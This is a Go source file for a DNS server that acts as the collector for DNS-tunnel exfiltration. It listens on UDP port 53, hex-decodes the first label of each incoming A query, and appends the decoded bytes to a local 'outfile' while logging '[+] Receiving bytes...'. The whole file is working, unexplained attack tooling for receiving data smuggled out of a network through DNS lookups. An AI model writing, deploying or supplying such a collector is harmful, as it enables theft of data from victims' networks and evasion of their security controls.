package main

import (
	"net"
	"strconv"
	"log"
	"strings"
	"github.com/miekg/dns"
	"encoding/hex"
	"fmt"
	"os"
)

type handler struct{}
func (this *handler) ServeDNS(w dns.ResponseWriter, r *dns.Msg) {
	msg := dns.Msg{}
	msg.SetReply(r)
	switch r.Question[0].Qtype {
	case dns.TypeA:
		msg.Authoritative = true
		domain := msg.Question[0].Name

			var domainsToAddresses map[string]string = map[string]string{
				domain: "0.0.0.0",
			}

		address, ok := domainsToAddresses[domain]

		if ok {
			fmt.Println("[+] Receiving bytes...")

			msg.Answer = append(msg.Answer, &dns.A{
				Hdr: dns.RR_Header{ Name: domain, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: 60 },
				A: net.ParseIP(address),
			})

			split := strings.Split(domain, ".")
			split2 := split[0]
			decoded2, myerr := hex.DecodeString(split2)
			if myerr != nil {
				fmt.Println(myerr)
			}

			p, perr := os.OpenFile("outfile",
      os.O_WRONLY|os.O_APPEND|os.O_CREATE,
      0666)
			if perr != nil {
				fmt.Println("[-] Error creating the outfile...")
			}
			defer p.Close()

			p.Write(decoded2)

		}
	}
	w.WriteMsg(&msg)
}

func main() {
	srv := &dns.Server{Addr: ":" + strconv.Itoa(53), Net: "udp"}
	srv.Handler = &handler{}
	if err := srv.ListenAndServe(); err != nil {
		log.Fatalf("Failed to set udp listener %s\n", err.Error())
	}

}
